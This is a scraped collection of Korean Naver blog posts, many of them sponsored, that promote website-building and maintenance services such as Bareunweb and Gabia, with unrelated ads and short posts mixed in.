것입니다. ​만약 좀 더 제대로 된 서비스를 위한 홈페이지를 구상 중이라면 제작보다는 관리에 더 초점을 두어야 합니다. - 이 홈페이지의 소유권에 대한 확정 (많은 업체들이 그렇게 하지 못합니다.)- 홈페이지 수정이 자유로운지 (무료로 만들어주고 추가 수정은 과한 요금을 청구하는 경우가 많습니다.)- 보안 문제 : 바이러스, 스팸 등 다양한 공격에 대한 대비가 되어 있는가?- 반응형 홈페이지 : 반드시 반응형으로 만들어야 합니다. PC, 모바일, 태블릿 등 다양한 환경에 맞춰서 내 홈페이지가 자연스럽게 보여야 해요. 이것조차 못하는 업체도 있답니다. ​결국 만드는 것보다는 관리가 문제이기에, 많은 홈페이지 제작업체들이 관리 측면에서 과도한 비용을 물리게 됩니다. 이미 만들어 놓고, 고객들한테 선보였으니 어쩌겠습니까? 지불하고 관리해야지요... 바른웹 홈페이지제작업체 활용에 대한 의견 바른웹 업체에 대해서 여러 차례 제가 홍보를 해 왔습니다. 개인적으로 '무료'에만 관심이 있는 분이라면 반드시 직접 해야 한다고 생각해요. 무료의 함정에 빠진 사람일수록 나중에 더 큰돈이 들어갈 확률이 높다고 생각하거든요. ​반대로 내가 할 수 없는 일이기에 제대로 된 전문가를 선택해야 한다고 생각해요. 제가 주식 관련으로 몇 가지 홍보하고 있는 것들에도 누누이 강조하는 것입니다. 내가 모든 걸 할 수 없기에, 내가 필요하지만 직접 하지 못하는 것은 정당한 비용을 지불하고 괜찮은 전문가를 쓰는 게 가장 현명하지요. 여기서 그 괜찮은 전문가를 선택하는 것이 가장 중요하겠습니다. ​바른웹 업체는 제가 위에 언급한 것들에 대해서 투명성을 제공할 뿐만 아니라, 추후 관리에 들어가는 비용에 대해서 미리 공개를 다 하고 있기 때문에 뒤통수 맞을 일이 없다는 것입니다. 지난 7년 동안 만 개 이상의 홈페이지를 만든 노하우는 덤이라고 생각하고요. 믿고 맡길 수 있느냐? 신뢰의 문제입니다. ​모든 기업은 이윤은 추구합니다. 내 사업에 홈페이지 제작을 추가하는 것도 더 큰 이윤에 기여시키기 위해서죠. 홈페이지 제작업체도 마찬가지입니다. 다만, 눈속임으로 돈만 벌려고 하느냐, 제대로 해주고 정당한 대가를 받는 곳이냐의 차이인 것 같습니다. ​홈페이지 제작 가격이나 기타 바른웹에 대한 다른 정보들은 이곳 홈페이지에 가셔서 살펴보시기 바랍니다. 바야흐로 인터넷 공간의 활용이 더더욱 커지는 시점입니다. 온라인에서 아무것도 하지 않는 사업은 살아남기 어려울 거예요. ^^​바른웹 공식웹사이트 바로 가기 <<< ​  홈페이지제작및관리 간편정보 편하게 알아보는 홈페이지 제작 및 관리 시 체크사항   알아야 할 건 많은데, 시중에 정보들은 넘쳐나죠?빠르게, 정확하게, 좋은 정보를 효율적으로 얻고 싶으실 겁니다.오늘 제가 가져온 정보는 그런 분들을 위한 맞춤 정보라고 할 수 있겠습니다!홈페이지제작및관리에 대한 정보~ 지금 바로 확인 하세요^^    홈페이지 제작 시 네비게이션과 유저인터페이스는 철저하게 사용자 입장에서 체크해야 해요. 즉, 정보를 정확하게 찾을 수 있고 어떤 화면에서든 쉽게 다른 화면으로 이동이 가능해야 합니다.    무엇보다도 홈페이지 메인화면은 간단한 형태로 사이트의 내용을 요약해서 보여주어야 하는데요.메인페이지만 봐도 홈페이지의 중요한 내용을 알 수 있게 뚜렷한 의미를 전달해야 한답니다.특히 도메인은 홈페이지 제작 시 꼭 확인해야 하는 사항이에요.이때 도메인은 짧고 외우기 쉽고, 업종이나 제품의 키워드를 포함하는 게 좋답니다.특히 최상위의 도메인은 .com이나 co.kr을 사용해야 외우기에 간편해요.그뿐만 아니라 홈페이지 제작 시에는 호환성을 필히 고려해야 합니다.브라우저의 종류에 따라서 화면이 잘못되거나 기능 요소들이 안 좋아질 수 있으니크롬, 사파리, 파이어 폭스 등의 브라우저 종류에서 호환성을 살펴봐야 해요.  개발비용은 홈페이지 제작 및 관리 시에 확인해야 할 기본적인 요소입니다.개발비용을 줄이기 위해서는 웹사이트에 기능을 없애거나 설치형 블로그, 제로보드 등의 템플릿 제공 서비스를 선택하는 방법이 있어요.   홈페이지 제작, 알아두면 이득 되는 정보!   홈페이지는 제작뿐만 아니라 효율적으로 관리해서 사업에 이익을 내야 하는데요.  이를 위해서는 꾸준하게 제품 신규 정보를 정리하거나 수정하고 관리해야 하므로  조작이 쉬운 홈페이지 관리 툴을 이용해야 한답니다.     홈페이지는 사업의 매출과 연결되는 만큼, 사용자의 핵심가치를 고려하여 탄탄한 기획을 구성해야만 홈페이지의 구매전환율과 성공률을 동시에 끌어올릴 수 있어요.특히 온라인 홈페이지를 계획할 때는 홍보용으로 이용할 것인지, 판매용으로 이용할 것인지 홈페이지의 용도와 목적을 명확히 정한 후메뉴 구성과 컨텐츠를 배분하는 것이 좋습니다.한편 무료 계정으로 홈페이지를 제작하게 되면, 개인의 ID와 도메인을 부여받는데요. 계정을 제공한 업체의 출처로 주소가 설정되는 단점이 있습니다.  덧붙여 홈페이지를 만들 때에는 주제가 구체적인 나만의 사이트를 기획해야 하는데  그러기 위해서는 사이트에 포스팅할 자료를 평상시에 많이 수집해서 정리해두는 것이 좋아요.   같은 기종이어도 가격이 다양한 중고폰 매입, 믿을만한 곳에서 하는 곳이 중요합니다.신뢰를 주축으로 품질 높은 서비스를 제공하는 폰스샵에서 현명하게 중고폰 매입하세요!타사 대비 무조건 높은 매입가를 보증하는 아이폰 중고 전문 매입업체인 폰스샵은일반 폰은 물론 깨진 액정 및 파손폰도 즉시 매입해 높은 고객 만족도를 보장해 드려요.매입 후 바로바로 현금으로 입금해 드리는 폰스샵의 신속하고 세밀한 일 처리!파손 정도와는 상관없이 완벽하게 복구해 드리는 액정 수리 서비스도 경험하세요!얼마를 생각하든, 기대를 뛰어넘는 매입가를 약속하는 폰스샵이 여러분을 기다립니다!중고폰 매입 관련 전화 문의 >> 1588-9638    기억은 무척 중요한 역할입니다. 시험을 봐도, 법정에서 증언해도     결국에는 모든 기억에 의존해 이루어지는 거죠.   홈페이지제작및관리에 대한 기억은 어떻게 남을지 궁금한데요~ 오래 좋은 것만 남으면 좋겠습니다! 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가​​​온라인을 통하여 다양한 방법을 사용하여마케팅을 진행하는 분들이 많이 계십니다.매출 증대에 크게 영향을 끼치고 있는만큼최근에는 이러한 온라인 마케팅이 선택이아닌 필수로 자리잡았다고 해도 과언이 아닌데요.개인은 물론 병원, 프랜차이즈, 중소기업과대기업까지 많은 분들이 관심을 가지고시작하고 계십니다.​​​ ​​​매 달 검색 광고나 유튜브를 이용하여다양한 방식으로 홍보를 진행하고 있음에도별다른 효과가 느껴지지 않는다면 방법이잘못되지는 않았는지 체크해보는 것이 필요합니다. 특히나 사업을 이제 막 시작한 분들은다양한 곳에서 마케팅을 시행하게 되는데요.요즘에는 물건을 구입하기 전이나어딘가를 방문하기 전 믿을 수 있는 브랜드인지괜찮은 기업인지를 먼저 확인하고 방문하거나구매하는 경우가 많이 있습니다.이렇듯 소비자가 이러한 정보를 접할 수 있는 곳은바로 기업의 홈페이지라고 할 수 있습니다.​​ ​​​고객인 자신의 페이지로 접속한 순간 약 5초 내외의짧은 시간 동안 모든 것들이 결정된다고 합니다.경쟁률이 치열한 분야일 경우 시선이 머무는 짧은순간 흥미나 호기심을 유발시키지 못한다면소비자는 이미 로그아웃했다고 생각해도무방한데요. 수익과 연결이 되어있는 경우가많기에 여러가지 사항들을 중요하게 따져보는 것이필요합니다. ​ ​홈페.이지는 한 번 제작하였다고 끝나는 것이 아닌지속적으로 정보를 업데이트하여야 신뢰감을 쌓을 수있기에 간편하게 관리할 수 있어야 합니다. 또한 트렌드에 맞춘 디자인을 새롭게 배치하고알림사항이나 행사를 팝업창을 통해알려주는 등 케어에도 신경을기울이는 것이 필요합니다. ​​​ ​​홈 페이지는 제품이나 기업에 대한 긍정적인이미지를 구축하고 신뢰감을 쌓는데 중요한요소로 작용할 수 있습니다. 그렇기에광주홈페이지제작이 필수적으로 필요하다고말씀드릴 수 있습니다.그러나 필요성은 이미 체감하고 있지만금액적인 부분으로 인해 고민이신 분들이많이 계실거라 생각합니다. 다양한 곳에 문의하여 견적을 제시해도 부르는 게값이라는 말처럼 편차가 너무 크기 때문인데요.일반인들의 경우 합리적인 가격인지를 가늠해보기어렵기 때문에 쉽사리 시작을 하지 못하고망설이거나 이내 포기하는 분들이 많이 계시는실정입니다.​​ ​​​얼마나 어려운 구조로 되어있고 어느정도의시간이 필요한지 그리고 디자인이 얼마나들어가는지에 따라 가격변동이 큰 홈페이 지 제 작!이 곳에서 견적을 받아보신다면필수로 들어가야할 기능은 살리고 기타 불필요한요소들은 줄여줌으로써 경제적 부담감을 줄여드리고있습니다. ​​ ​​​홈페 이지는 관리자 모드가 쉬워야 사용하기에번거로움이 없다고 말씀드릴 수 있습니다.어렵고 복잡한 과정들로 인해 사후관리를하지 못한다면 오래도록 방치만 하게 될 수 있기때문입니다. 그렇기에 이를 쉽게 운영하실 수 있도록도와드리며, 전반적인 부분들까지간편하게 관리하실 수 있도록 제 작해드리고 있습니다.​​​ ​​컴퓨터는 물론 요즘에는 많은 분들이 모바일을 통해접속하는 경우가 많기에 반응형으로 제 작하는 것또한 고려해볼 수 있는데요. 다양한 기기에 따라화면이 변화하기때문에 소비자 입장에서는보다 편리하게 이용할 수 있게 됩니다.더불어 기술력을 바탕으로 만족감있는웹서비스를 제안해 드리고 있으며업체 이미지에 맞는 광주홈페이지제작을 진행하고있습니다. 뿐만 아리나 카페, 블로그, SNS 등의바이럴 마케팅까지 모두 시행하고 있어보다 합리적인 금액으로 편하게 시작하실 수 있습니다.​​ ​​광주홈페이지제작은 희망하는 목적을 달성할 수 있도록맞춤형으로 구성되는 것이 좋습니다.희망하는 업종 및 회사별 개인별 등제 작이 필요한 곳에 효과적인 진행을 위해 노력하고 있으며추가적인 설명과 궁금점이 있으신 분들은상담을 통해 과정에 대한 안내를 받으신다면도움이 될거라 생각합니다.여러가지 상황으로 인해 경제적인 분위기가긍정적이지 않은 상황이지만 자영업자분들 모두조금만 더 힘내시길 바라며, 시작을 준비하는 분들은용기를 내시기를 바라겠습니다.​​​ 궁금할 땐 네이버 톡톡하세요! ​​​  ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가홈페이지관리 완벽 이해홈페이지 제작 및 유지보수, A부터 Z까지 파악해보자!안녕하세요~ 오늘은 홈페이지제작및관리에 대한 포스팅 준비 했습니다!나만 알기 아까운 정보들이라 나눠 드리고자 합니다!나눌수록 늘어나고, 더 좋아지는 것들이 있는데 정보 또한 마찬가지 잖아요. 자기만 알고 있으면 커질 수 없는 홈페이지제작및관리에 대한 정보 함께 알아볼까요?홈페이지 기획 때에는 합리적인 처음 값보다 확고한 운영 손질 및 사후관리가 매우 필수적입니다. 따라서 후자를 우선적으로 확보하고 기업을 선택하기 바랍니다.최근 온라인사이트 디자인 변화를 해석하면 예쁜 디자인보다는군더더기 많지않은 멋스러운 스타일의 홈페이지가 조금이라도 환영받고 있으며,홈페이지를 최초로 준비할 때엔 선정 원본을 꼭 받아야 하며 디자인 원본을 확인하지 않을 가능성도 존재하니 웬만하면 시안 작업할 알림 전 확실하게 검토하시기 권유합니다. 제작 원본이 남을 상황에는 향후에 어떠한 대출사를 바탕으로 수정이 가능합니다.대부분의 소비자들은 웹페이지 주문 완료 후 발생되는 지속 비용에 도메인 및 호스팅 연장 비용만을 예상하는 경우가 많습니다.홈페이지 지점 시정 및 부가적으로 또한 삭제의 상태에도 수리비가 계산될 수 있으니이 점에 대해서는 꼭 자세히 검토하시기 바랍니다.최근에는 핸드폰 구매자 수가 늘어나면서 반응형 싸이트 준비 제공 결정이 중요해졌습니다.반응형 싸이트 수리가 가능해지면서 반응형 웹페이지 한가지로 모든 컴퓨터 해상도, 휴대폰 기기에 얽매이지 않고도 사이트 진행이 가능하게끔 되었습니다.홈페이지 코딩 프로그램, 확실하게 알아보자!홈페이지 기획 업체에서는 페이지를 디자인할 때 대개 웹디자이너와 개발자의 협업으로 이루어지는데,웹디자이너가 포토샵으로 홈페이지 모형을 완성하면 개발자가 사람들을 코딩하여 인터넷에 등록하는 것이 일반적입니다.홈페이지를 만들 때 스스로가 디자인을 했다고 하더라도 완벽한 홈페이지를 구축하기 위해서는 웹싸이트 HTML 코딩 작업이 필요하며,홈페이지를 만들 때 가장 중요한 코딩의 사전적 의미는 ‘부호화한다’는 뜻입니다.컴퓨터 기계에게 말하기 위하여 컴퓨터 언어인 코딩이 필요한 것입니다.보다 시각적인 웹페이지를 제작하려면 홈페이지에 스타일을 입힐 수 있는 스타일 시트를 사용해야 하며, 액션이 있는 홈페이지를 만들기 위해서는 자바스크립트를 이용하는 것이 좋은데요.HTML 문서에 지은 파일명은 홈페이지를 구동하는 역할을 하게 됩니다.대부분 index.html로 만들어야 정상적으로 구동됩니다. 소수의 홈페이지 무료 계정 사이트에서는 문서 이름을 default. Html로 해야 되는 경우도 있기 때문에 해당 사이트에서 먼저 확인해 보아야 합니다.온라인 창업에 꼭 필요한, 홈페이지! 만들긴 만들었는데, 관리가 까다롭다고요?홈페이지 제작에서 사후관리, 유지보수, 마케팅까지 종합적으로 해결해 드리는 다브가 책임지겠습니다!다브는 홈페이지 제작 외에도 관리자 모드를 설치, 업데이트나 수정사항을 고객님 스스로설정할 수 있어 관리비 금액 부담이 없습니다. 또한, 제작비 무료! 호스팅 비용만으로모바일 홈페이지까지 모두 함께 제작할 수 있는 푸짐한 혜택도 제공하는데요.또한 다국어 시스템이 구성된 자동 번역 쇼핑몰 온라인 사이트도 제작, 해외에서 효율 높은 쇼핑몰 솔루션으로 가성비 최고치를 자랑합니다.홈페이지 제작 후 컴퓨터에 대해 전혀 모르시는 고객도,마케팅 솔루션을 분석하고 싶은 고객도 다브와 함께라면 간편해집니다. 지금 문의하세요!착한 가격으로 쉽고 빠르게 홈페이지, 쇼핑몰 제작홈페이지제작및관리에 대해 알아봤어요!이 정보가 도움 되셨나요? 따라오시느라 수고하셨습니다~!오늘 배운 홈페이지제작및관리에 관해 정리하시면서 쉬세요~순간의 여유가 우리의 삶을 더 풍요롭게 만들어준답니다.네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가임대형보다 더욱 저렴한 독립형 홈페이지 제작 - 바른웹신청하기 : https://bit.ly/3rtjhMR 월 3만원으로 내 소유의 홈페이지를? 지금 상담 신청하세요!바른웹은 7년간 10,000여개 이상의 홈페이지를 제작해온 회사로써 풍부한 홈페이지 제작 경험으로, 다양한 제작 프로그램이 대부분 개발되어 있어 제작비용을 무료로 제공할 수 있게 되었습니다. 고객님의 홈페이지를 운영할 관리비용 월 3만원이면 임대하는 홈페이지가 아닌 본인 소유의 홈페이지를 가질 수 있습니다. 바른웹 제작 독립형 홈페이지는 5년 이후 비용이 발생하지 않으며, 홈페이지 본인 소유, 홈페이지 임의수정이 가능하기 때문에 오래 사업을 하시는 고객님들께 비용 절감의 기회가 될 수 있습니다. 표준형 홈페이지 무료제작 서비스를 신...bit.ly ​바른웹은 7년간 10,000여개 이상의 홈페이지를 제작해온 회사로써 풍부한 홈페이지 제작 경험으로,다양한 제작 프로그램이 대부분 개발되어 있어 제작비용을 무료로 제공할 수 있게 되었습니다.​고객님의 홈페이지를 운영할 관리비용 월 3만원이면 임대하는 홈페이지가 아닌 본인 소유의 홈페이지를 가질 수 있습니다.바른웹 제작 독립형 홈페이지는 5년 이후 비용이 발생하지 않으며, 홈페이지 본인 소유,홈페이지 임의수정이 가능하기 때문에 오래 사업을 하시는 고객님들께 비용 절감의 기회가 될 수 있습니다. 임대형보다 더욱 저렴한 독립형 홈페이지 제작 - 바른웹표준형 홈페이지 무료제작 서비스를 신청하시는 모든 고객님께1. 최대 32페이지 분량의 모바일 홈페이지 무료로 제작2. 원하는 도메인 무료등록3. 2차 백업 서비스 무료제공, 방화벽 무료 세팅다양한 혜택이 있다는 점을 강조하여 홍보 활동을 하신다면 도움이 될 것으로 생각됩니다.  무료제작 기본혜택소문내기 활동을 하면서 해당 광고업체로부터 경제적 대가를 받을 수 있습니다. 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가작년초부터 코로나19가 시작되면서 모든 것들이 비대면으로 이루어지는 경우가 대부분 인 것 같습니다.솔직히 그게 편하기도 합니다. 사람과의 접촉으로 코로나19가 전파되는 만큼 사전에 차단하는 효과도 있으면서그러면서도 안전하게 홈페이지를 제작해 볼 수도 있습니다.잘 만들어진 홈페이지는 보는 사람으로 하여금 신뢰감도 느끼도록 만들어주고일목요연하게 잘 꾸며진 홈페이지는 한 눈에 알아보기도 좋아요.개인이 만든다면 만들기도 힘들 것 이고 어떻게 배치를 해야할지 그리고 무엇을 어떻게 진행을 해야할지도 정리가 안되는 부분입니다. 이럴때 전문가의 도움으로 자신이 원하는 홈페이지를  무료로 만들 수 있다면시간적으로도 경제적으로도 많은 도움이 될 것으로 생각합니다.​템플릿 형태가 아니라 전문 디자이너들이 직접 디자인하는 플랫폼입니다.무료 홈페이지 만들기는 바른웹이 키 포인트입니다.​**월 3만원의 관리비만으로 나만의 개성있는 홈페이지를 만들 수 있는 바른웹** 무료 홈페이지 만들기는  바른웹​​누구나 홈페이지가 필요하다면 여러군데에 비용을 의뢰해봅니다.가격이야 당연히 천차만별이겠죠.그러나 조금 더 알아본다면 나만의 홈페이지를 돈을 들이지 않고 만들어 볼 수도 있다는 것 입니다.전문 디자이너들이 의뢰자의 요구사항에 맞게 꼭 필요한 홈페이지를 비용없이 제작해 드립니다.PC홈페이지 제작 같은 경우에는 타사 맞춤형 제작시에 13페이지를 기준으로 하는 비용이 130만원인데 여기서는 금액을 지불하지 않고 무료로 만들어 볼 수 있습니다.제품을 판매하기 위해서 자신의 홈페이지가 절실했던 분에게는 완전 희소식이 아닐 수 없습니다.​나에게 꼭 필요하면서도 사용하기 쉽게 만들기란 쉬운일이 아닌데 무료 홈페이지 만들기 제작업체 바른웹에서는 전문 디자이너들이 의뢰자의 요구에 맞춰 홈페이지를 제작하는 서비스를 제공합니다.​ 무료 홈페이지 만들기  바른웹  ​​무료 홈페이지 만들기 신청하기(클릭)​​임대하는  웹사이트가 아니라 의뢰인 소유의 홈페이지를 제작해 주는 곳 입니다.5년 이후에는 비용이 발생되지 않아서 사업을 오래동안 하시는 분이라면 비용을 절감할 수 있는  유익한 기회가 될 것 입니다.관리비용 월 3만원이면 임대하는 홈페이지가 아니라 본인 소유의 홈페이지를 가질 수 있는 것 입니다.​알아듣기 쉽게 설명을 하자면 다음과 같습니다.아래에 두개를 보기 쉽도록 비교를 해 놓았습니다. 5년이 지나면 비용발생이 없어요. 그리고 홈페이지의 소유권은 본인에게 있습니다.홈페이지의 임의수정도 가능해요. 비용적인 부분에서도 84%나 절감의 효과가 있습니다.굳이 비용을 더 비싸게 지불하고 만들어야할 이유가 없을 것 같습니다.몰랐을때는 그렇게 만들 수 있겠죠 그러나 알고 난 후에 그렇게 하실 분은 없을 것으로 생각합니다.​ 무료 홈페이지 만들기  바른웹​ 무료 홈페이지 만들기  바른웹​요즘 인터넷으로 사업을 하시는 분들이 늘어나면서 개인 홈페이지를 만드시는 분들이 많이 늘어나고 있습니다.그래서 홈페이지를 제작할때도 이왕이면 오랜시간동안 홈페이지를 제작하면서 노하우를 가지고 있는 업체가 훨씬 좋을겁니다.(주)바른웹은 7년간 10,000여개 이상의 홈페이지를 제작하여온 회사입니다.그러니 다년간의 풍부한 홈페이지 제작의 경험으로 다양한 제작 프로그램이 대부분 개발이 되어 있어서제작비용을 무료로 제공할 수 있을만큼 이 분야에선 탄탄한 업체임을 증명합니다.  이제부터 온라인 사업은 "기업부설 연구소" 인증회사 (주)바른웹에서 시작을 해 보시기 바랍니다.​무료제작의 기본혜택들입니다.월 3만원의 관리비, 하루에 1000원꼴인데 평생동안 전문 디자이너가 내 홈페이지를 관리를 해 주는 것 입니다.이것만봐도 완전 매력적일 수밖에 없는 것 같습니다.​ 무료 홈페이지 만들기  바른웹​ 구글, 네이버 등 포털 사이트 등록 웹마스터 도구 최적화 임대형 홈페이지보다 훨씬 저렴한 비용으로 (주)바른웹에서 홈페이지를 장만할 수 있어요.​홈페이지는 회사의 모든 정보 창고입니다. 그래서 홈페이지의 첫인상은 매우 중요할 수 밖에 없는 이유이기도 합니다.우리집을 찾아오는 사람에게 깨끗하게 꾸며진 현관이 중요한 것 처럼홈페이지의 첫인상은 매출과 연관이 될 만큼 정말 중요한 부분입니다.​표준형 홈페이지를 무료제작해 드립니다.서비스를 신청하는 모든 분들께 모바일 제작비용 80만원이 무료입니다. ​전문 디자이너가 만드는 나만의 개성있는 홈페이지를 무료가격 또는 착한가격으로 만나보시길 바랍니다. 굳이 비싼돈을 지불할 이유가 있나요?PC, 태블릿, 모바일 어디를 접속해도 보기쉬운 나만의 홈페이지를 통해서 경쟁력을 가지시길 바랍니다.​온라인 사업은 잘 만들어진 홈페이지에서 시작합니다.​ ​​ 무료 홈페이지 만들기 신청하기​ ​​​#반응형홈페이지 #기업홈페이지 #홈페이지제작비용 #홈페이지제작업체 #홈페이지제작플랫폼 #바른웹 #무료홈페이지만들기#무료홈페이지만들기 ​​​​​​​​​​​  ​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가가비아에서 간편하게 홈페이지관리하기!  온라인 쇼핑몰 제작이나 회사 홈페이지제작 준비하실때 어디에서 하실지 고민되시죠!저도 '자매뿜' 쇼핑몰 준비 할때 어떤 곳에서 홈페이지를 제작 할지 엄청난 고민을 했었거든요~홈페이지제작때문에 고민하시는 분들에게 조금이나마 도움이 되고자제가 고민고민하고 비교비교해서 선택한 곳 '가비아'에 대해 소개해드릴려고합니다.'자매뿜'의 도메인, 쇼핑몰 홈페이지 모두 가비아에서 했거든요! (벌써 연장도 했어요 ㅎㅎ) '홈페이지제작'이라고 하면 왠지 전문가만 할 수 있을 거 같고.. 어렵게 생각하시는 분들이 많으실텐데그런 분들을 위해 가비아에는 통합패키지 솔루션! 이 있답니다 ㅎㅎ도메인+호스팅+홈페이지무료제작+유지보수+보안+메일계정까지!비용절감이 되서 가격 부담없이 홈페이지를 제작하고 관리 할 수 있겠어요~         새로운 홈페이지 제작과 관리는 물론이고, 기존 홈페이지 관리, 유지보수도 가능하다는 거!          특히 제가 가비아 도메인과 쇼핑몰을 이용하면서 너무 감사한것은,저희도 홈페이지 제작,관리를 처음하는 거라 이것저것 모르는게 너무 많았거든요..ㅜㅜ쇼핑몰을 관리하면서 잘 모르는 것들, 정말 사소한 문의에도 빠르고 정확하게 답변해주신다는 것에 너무 감사했어요!문의하기도 죄송할정도로 사소한 문의도 많이했었거든요..ㅎㅎ근데 알고보니 가비아에는 유지보수 전담팀이 있어 요구사항 및 문의에 대한 빠른 처리가 가능할 수 있다고 합니다.         가비아에서 홈페이지도 제작해보았어요!도메인도 자유롭게 만들고, 홈페이지의 디자인도 직접 선택했습니다.그리고 이 홈페이지 관리를하기 위해 저에게 맞게 약간의 수정이 필요할거 같더라구요~​​         홈피에지 관리대행 '작업요청'을 해봤어요~         간단한 정보를 입력하고요청내용에 수정하고자 하는 부분을 작성하시면 끝!저는 '카테고리 수정'과 홈페이지 하단 '회사 정보'에 대한 수정을 요청했습니다.         26일 월요일 저녁에 홈페이지 관리를 위한 수정을 요청드렸어요.         근데 그 다음날 일하고 있는데 문자 띵동!27일 화요일 바로 홈페이지 수정 완료 문자가 왔어요!헉빠름빠름​​ ﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿﻿​​​​​​​​하지만 가비아의 문의 및 수정요청 처리가 빠른건 이미 알고 있었기에제 요구사항에 맞게 홈페이지 수정이 잘 되었는지 확인해봐야겠죠! ﻿﻿﻿﻿﻿﻿﻿﻿﻿​​​​​​도메인을 쳐서 홈페이지에 들어가보니제가 요청한대로 카테고리 명도 수정되어있고,  하단 회사정보도 정확히 변경되어있네요!​가비아 디자인팀, 유지보수팀 각 전담팀이 있어 정말 빠르고 정확한 홈페이지 관리가 되는 것 같습니다~​​​이미지나 배너, 팝업, 페이지 구성 변경, 텍스트 수정 등 모든 수정요청만 하면뚝딱 홈페이지 관리가 가능하답니다 ㅎㅎ​온라인 쇼핑몰, 홈페이지 제작하고 운영하면서 신속함은 꼭 필요하거든요!홈페이지에 들어오시는 유저분들께 얼른 수정된 홈페이지를 보여드려야하기때문에 수정을 늦게 해주시면........초초하고...곤란하겠죠ㅜㅜ​문의에 대한 빠른 답변뿐 아니라 다소 복잡할 수 있는 홈페이지 수정에 대한 부분은 직접 수정도 해주셔서 저는 마음 편히 홈페이지 관리와 운영을 할 수 있는 거같아요~​홈페이지 관리와 제작,가비아와 함께라면 어렵지 않아요:)​​ ​​ ﻿https://maintain.gabia.com/service가비아 - 홈페이지 관리대행 서비스, 저렴한 가격, 호스팅, 유지보수 지원maintain.gabia.com 이 글은 홈페이지 관리대행 서비스를 소개하면서 가비아로부터 경제적 대가를 지원받아 작성한 포스팅 입니다.네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가모바일 최적화 홈페이지의 생성부터 사진, 동영상, 게시글, 카테고리, 메뉴 등등회사소개, 주소, 약도, 연락처, 주문, 게시판, 질문답변, 끝도없이 다양한 컨텐츠들을 순식간에 만들어내고 네이버 검색등록 까지 하는데 고작 20 만원 이면 된다.옛날에는 홈페이지 만들려면 최소 100만원이 들었는데 요즘은 홈페이지 제작비용이 거의 무료로 인건비 수준이다.심지어 모바일 시대인 만큼 모바일 최적화 홈페이지다.원하는 내용 원하는 글 원하는 동영상 원하는 사진 디자인도 원하는 대로 정말 모든 기능이 다 만들어지는 홈페이지 제작부터 꾸준히 게시글 업데이트. 정보수정, 등 지속적인 관리까지 된다.웹 개발 전문 회사 JDLCcompany 제이디엘씨컴퍼니 에서 진행중이다.위 사진 맛보기 홈페이지 링크는 http://jdlc.modoo.at 입니다.​ 네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가[홈페이지관리방법 강의]가평군농업기술센터 홈페이지관리 강의를 다녀왔습니다~가평군농업기술센터 홈페이지관리 전략에 대한 강의를 진행하였습니다.^^ 펜션하시는분들에게는 홈페이지관리가 바로 예약률에 영향을 미치기때문에 아주 중요합니다^^ 홈페이지는 얼굴입니다. 홈페이지를 제작후 공지사항이나 질문과답변등고객과 소통하는 커뮤니티 관리가 아주 중요합니다.대부분의 펜션주께서는 홈페이지를 구축해놓고 검색광고에만 신경쓰고 홈페이지 관리는 별로 신경을 쓰지 않는 경우가 많이 있습니다. 홈페이지는 예약률과 바로 연결되는 마케팅 수단이기 때문에 관리가 아주 중요합니다.어떻게 관리하고 어떻게 운영해야 하는지 온라인 마케팅이 무엇인지에 대하여 2시간 동안 가평군농업기술센터에서 강의가 있었습니다.네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가네이버 블로그는 맞지만, 확인불가​<드레스 홈페이지 제작 및 관리>- 홈페이지 모든 디자인 작업- 내부전경 촬영- 상품 등록- 홈페이지 관리 (디자인, 간단한 코딩, 에러사항 개선 etc.)​디자인 의뢰, 견적 문의는 메일로 문의 주시길 바랍니다.​   ​-메인해상도 75% 기준으로 스크린샷하여 화질 및 해상도가 떨어집니다.본 홈페이지에선 정상적으로 보이며,전체적인 작업 분위기를 보여드리기 위함임을 알려드립니다.​   ​-모바일 화면PC 버전과 같은 디자인으로 가되모바일상에선 조금 더 깔끔하게 보일 수 있도록 제작 하였습니다.​   ​ 창원몰 입점업체 회원들의 사진촬영법 및 홈페이지 관리교육늦은밤까지 열공하는 모습대박나시기를...농업기술센터 도시농업공원 주변에서 사진촬영 실습네이버 블로그는 맞지만, 확인불가 투교협 홈페이지에서 얻을 수 있는 다양한 자료들 ! 이제 그 마지막 이야기 , '홈페이지 이러닝'에 대해 알려드리려고 해요 : )  투교협 홈페이지 상단바를 통해 들어가도 되구요 , 중간에 있는 일반인을 위한 온라인 교육관을 클릭해도 된답니다 ^ ^ 온라인 교육관을 클릭하면 제일 먼저 보게 되는게 바로 '아카데미관'인데요 , 지금은 '자산관리 아카데미'가 업로드 되어있어요 ,  전에도 말씀드렸지만, 투교협에서 제공되는 컨텐츠는 모두 무료랍니다 ^ ^ 수강신청을 하더라도 , 무료로 수강할 수 있어요 ㅎ 신청을 하게 되면 과정정보 확인 / 인적사항 확인후에 신청이 완료된답니다 : ) 모두 이수하게 되면 이수증도 출력해서 받아볼 수 있어요 ^ ^  아주 기초 자산관리 지식부터 랩어카운트 , 펀드, 퇴직연금까지 , 자산관리의 전반적인 것들을 교육받을 수 있는 좋은 강의에요 ^ ^  따라서 처음 자산관리를 시작하시는 분들은 꼭 ! 한번 들어보시길 강력 추천 ! 드린답니다 